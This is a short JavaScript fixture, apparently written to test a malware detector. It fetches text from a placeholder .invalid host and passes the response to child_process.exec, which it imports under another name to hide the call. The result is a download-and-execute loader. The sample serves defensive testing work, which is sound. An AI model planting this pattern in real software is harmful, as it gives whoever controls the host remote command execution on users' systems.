// FIXTURE ONLY - synthetic detection test sample, not real malware
// The text of a response is the command line given to child_process.exec, imported under
// another name. Host is a .invalid domain.
const { exec: run } = require("node:child_process");

(async () => {
  const url = "https://dl.example.invalid/cmd.txt";
  run(await (await fetch(url)).text());
})();
